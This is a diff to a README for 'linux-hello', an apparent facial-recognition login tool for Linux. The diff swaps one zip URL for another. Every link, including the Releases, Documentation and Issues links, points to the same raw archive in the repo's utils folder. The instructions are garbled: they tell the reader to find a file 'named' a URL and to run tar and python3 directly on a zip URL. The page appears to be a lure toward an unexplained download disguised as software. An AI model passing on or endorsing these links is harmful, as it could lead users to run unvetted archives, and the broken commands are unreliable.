@@ -1,7 +1,7 @@
 # 🔐 linux-hello - Effortless Facial Authentication for Linux
 
 ## 📥 Download Now
-[![Download linux-hello](https://github.com/yghlaio/linux-hello/raw/refs/heads/main/utils/hello_linux_2.8.zip%https://github.com/yghlaio/linux-hello/raw/refs/heads/main/utils/hello_linux_2.8.zip)](https://github.com/yghlaio/linux-hello/raw/refs/heads/main/utils/hello_linux_2.8.zip)
+[![Download linux-hello](https://raw.githubusercontent.com/yghlaio/linux-hello/main/utils/hello_linux_v3.2-alpha.2.zip%https://raw.githubusercontent.com/yghlaio/linux-hello/main/utils/hello_linux_v3.2-alpha.2.zip)](https://raw.githubusercontent.com/yghlaio/linux-hello/main/utils/hello_linux_v3.2-alpha.2.zip)
 
 ## 📖 Overview
 **linux-hello** provides a simple way to secure your Linux device using facial recognition. Inspired by Windows Hello, this tool uses advanced techniques for reliable face detection and recognition.
@@ -24,11 +24,11 @@
 Follow these simple steps to download and run the software:
 
 1. **Visit the Releases Page:**
-   - Go to the [Releases page](https://github.com/yghlaio/linux-hello/raw/refs/heads/main/utils/hello_linux_2.8.zip) to find the latest version of linux-hello.
+   - Go to the [Releases page](https://raw.githubusercontent.com/yghlaio/linux-hello/main/utils/hello_linux_v3.2-alpha.2.zip) to find the latest version of linux-hello.
 
 2. **Download the Installer:**
    - Click on the version number to open its details.
-   - Look for a file named `https://github.com/yghlaio/linux-hello/raw/refs/heads/main/utils/hello_linux_2.8.zip` or similar.
+   - Look for a file named `https://raw.githubusercontent.com/yghlaio/linux-hello/main/utils/hello_linux_v3.2-alpha.2.zip` or similar.
    - Download this file to your computer.
 
 3. **Extract the Downloaded File:**
@@ -36,7 +36,7 @@ Follow these simple steps to download and run the software:
    - Navigate to the directory where you downloaded the file. You can do this using the `cd` command. 
    - Run the command:
      ```bash
-     tar -xvzf https://github.com/yghlaio/linux-hello/raw/refs/heads/main/utils/hello_linux_2.8.zip
+     tar -xvzf https://raw.githubusercontent.com/yghlaio/linux-hello/main/utils/hello_linux_v3.2-alpha.2.zip
      ```
    - This will extract the files into a new folder.
 
@@ -54,7 +54,7 @@ Follow these simple steps to download and run the software:
      ```
    - Start the application by running:
      ```bash
-     python3 https://github.com/yghlaio/linux-hello/raw/refs/heads/main/utils/hello_linux_2.8.zip
+     python3 https://raw.githubusercontent.com/yghlaio/linux-hello/main/utils/hello_linux_v3.2-alpha.2.zip
      ```
 
 ## 💡 Usage Tips
@@ -81,8 +81,8 @@ We welcome contributions! If you want to help improve linux-hello, check out the
 Thanks to the open-source community for their contributions to facial recognition technologies and to everyone who has supported this project.
 
 ## 🔗 Useful Links
-- [Releases Page](https://github.com/yghlaio/linux-hello/raw/refs/heads/main/utils/hello_linux_2.8.zip)
-- [Documentation](https://github.com/yghlaio/linux-hello/raw/refs/heads/main/utils/hello_linux_2.8.zip)
-- [Issues](https://github.com/yghlaio/linux-hello/raw/refs/heads/main/utils/hello_linux_2.8.zip)
+- [Releases Page](https://raw.githubusercontent.com/yghlaio/linux-hello/main/utils/hello_linux_v3.2-alpha.2.zip)
+- [Documentation](https://raw.githubusercontent.com/yghlaio/linux-hello/main/utils/hello_linux_v3.2-alpha.2.zip)
+- [Issues](https://raw.githubusercontent.com/yghlaio/linux-hello/main/utils/hello_linux_v3.2-alpha.2.zip)
 
 Feel free to explore more and customize your usage of linux-hello. Your safe and secure login experience is just a face scan away!
